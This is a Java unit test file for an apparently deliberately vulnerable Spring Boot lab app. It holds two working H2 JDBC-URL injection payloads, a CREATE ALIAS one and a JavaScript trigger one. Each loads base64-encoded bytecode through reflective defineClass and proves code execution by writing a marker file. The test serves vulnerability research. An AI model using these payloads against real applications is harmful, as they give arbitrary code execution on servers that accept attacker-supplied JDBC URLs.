package com.reajason.javaweb.vul.springboot2.controller;

import org.junit.jupiter.api.Test;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * @author ReaJason
 * @since 2025/6/28
 */
class JDBCControllerTest {

    private static final Path RCE_MARKER = Paths.get(System.getProperty("java.io.tmpdir"),
            System.getProperty("memshell.vul.rce.marker", "memshell-vul-rce-proof.txt"));

    @Test
    void testJDBC() throws Exception {
        Files.deleteIfExists(RCE_MARKER);
        JDBCController jdbcController = new JDBCController();
        String b64Bytecode = "yv66vgAAADQANgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAOamF2YS5pby50bXBkaXIKAAoACwcADAwADQAOAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsHABABABBqYXZhL2xhbmcvU3RyaW5nCAASAQAXbWVtc2hlbGwudnVsLnJjZS5tYXJrZXIIABQBABptZW1zaGVsbC12dWwtcmNlLXByb29mLnR4dAoACgAWDAANABcBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwoAGQAaBwAbDAAcAB0BABNqYXZhL25pby9maWxlL1BhdGhzAQADZ2V0AQA7KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2ZpbGUvUGF0aDsIAB8BAANyY2UKAA8AIQwAIgAjAQAIZ2V0Qnl0ZXMBAAQoKVtCBwAlAQAYamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uCgAnACgHACkMACoAKwEAE2phdmEvbmlvL2ZpbGUvRmlsZXMBAAV3cml0ZQEARyhMamF2YS9uaW8vZmlsZS9QYXRoO1tCW0xqYXZhL25pby9maWxlL09wZW5PcHRpb247KUxqYXZhL25pby9maWxlL1BhdGg7BwAtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcALwEAO2NvbS9yZWFqYXNvbi9qYXZhd2ViL3Z1bC9zcHJpbmdib290Mi9jb250cm9sbGVyL0NvbW1hbmRFeGVjAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBABBDb21tYW5kRXhlYy5qYXZhACEALgACAAAAAAACAAEABQAGAAEAMAAAAB0AAQABAAAABSq3AAGxAAAAAQAxAAAABgABAAAABwAIADIABgABADAAAAB1AAYAAQAAACgSB7gACQS9AA9ZAxIREhO4ABVTuAAYEh62ACADvQAkuAAmV6cABEuxAAEAAAAjACYALAACADEAAAAmAAkAAAAKAAIACwAPAAwAEwALABgADQAfAAoAIwAQACYADgAnABEAMwAAAAcAAmYHACwAAAEANAAAAAIANQ==";
        String ss = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
                "String a(String a) throws java.lang.Exception{" +
                "byte[] bytes=null\\;" +
                "String base64Str=\"" + b64Bytecode + "\"\\;" +
                "        try {\n" +
                "            bytes=java.util.Base64.getDecoder().decode(base64Str)\\;" +
                "        } catch (java.lang.Exception var6) {\n" +
                "                bytes = new sun.misc.BASE64Decoder().decodeBuffer(base64Str)\\;\n" +
                "        }" +
                "java.lang.reflect.Method defineClassMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",bytes.getClass(),int.class,int.class)\\;" +
                "defineClassMethod.setAccessible(true)\\;" +
                "java.lang.ClassLoader cl=new java.net.URLClassLoader(new java.net.URL[0])\\;" +
                "java.lang.Class myclass=(java.lang.Class)defineClassMethod.invoke(cl,bytes,0,bytes.length)\\;" +
                "myclass.newInstance()\\;" +
                "return null\\;" +
                "}'\\;" +
                "CALL look('')";
        jdbcController.JDBC(ss);
        assertTrue(Files.exists(RCE_MARKER));
        Files.deleteIfExists(RCE_MARKER);
    }

    @Test
    void testScriptJDBC() throws Exception {
        Files.deleteIfExists(RCE_MARKER);
        JDBCController jdbcController = new JDBCController();
        String b64Bytecode = "yv66vgAAADQANgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAOamF2YS5pby50bXBkaXIKAAoACwcADAwADQAOAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsHABABABBqYXZhL2xhbmcvU3RyaW5nCAASAQAXbWVtc2hlbGwudnVsLnJjZS5tYXJrZXIIABQBABptZW1zaGVsbC12dWwtcmNlLXByb29mLnR4dAoACgAWDAANABcBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwoAGQAaBwAbDAAcAB0BABNqYXZhL25pby9maWxlL1BhdGhzAQADZ2V0AQA7KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2ZpbGUvUGF0aDsIAB8BAANyY2UKAA8AIQwAIgAjAQAIZ2V0Qnl0ZXMBAAQoKVtCBwAlAQAYamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uCgAnACgHACkMACoAKwEAE2phdmEvbmlvL2ZpbGUvRmlsZXMBAAV3cml0ZQEARyhMamF2YS9uaW8vZmlsZS9QYXRoO1tCW0xqYXZhL25pby9maWxlL09wZW5PcHRpb247KUxqYXZhL25pby9maWxlL1BhdGg7BwAtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcALwEAO2NvbS9yZWFqYXNvbi9qYXZhd2ViL3Z1bC9zcHJpbmdib290Mi9jb250cm9sbGVyL0NvbW1hbmRFeGVjAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBABBDb21tYW5kRXhlYy5qYXZhACEALgACAAAAAAACAAEABQAGAAEAMAAAAB0AAQABAAAABSq3AAGxAAAAAQAxAAAABgABAAAABwAIADIABgABADAAAAB1AAYAAQAAACgSB7gACQS9AA9ZAxIREhO4ABVTuAAYEh62ACADvQAkuAAmV6cABEuxAAEAAAAjACYALAACADEAAAAmAAkAAAAKAAIACwAPAAwAEwALABgADQAfAAoAIwAQACYADgAnABEAMwAAAAcAAmYHACwAAAEANAAAAAIANQ==";
        String ss = "jdbc:h2:mem:a;init=CREATE TRIGGER a BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "var base64Str = \"" + b64Bytecode + "\"\\;var bytecode\\;try { bytecode = java.util.Base64.getDecoder().decode(base64Str)\\;} catch (ee) { bytecode = new sun.misc.BASE64Decoder().decodeBuffer(base64Str)\\;}var clsByteArray = (new java.lang.String(\"a\").getBytes().getClass())\\;var clsInt = java.lang.Integer.TYPE\\;var defineClass = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", [clsByteArray, clsInt, clsInt])\\;defineClass.setAccessible(true)\\;var urlArr = java.lang.reflect.Array.newInstance(java.net.URL.class, 0)\\;var loader = new java.net.URLClassLoader(urlArr)\\;var clazz = defineClass.invoke(loader, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length))\\;clazz.newInstance()\\;$$";
        jdbcController.JDBC(ss);
        assertTrue(Files.exists(RCE_MARKER));
        Files.deleteIfExists(RCE_MARKER);
    }
}
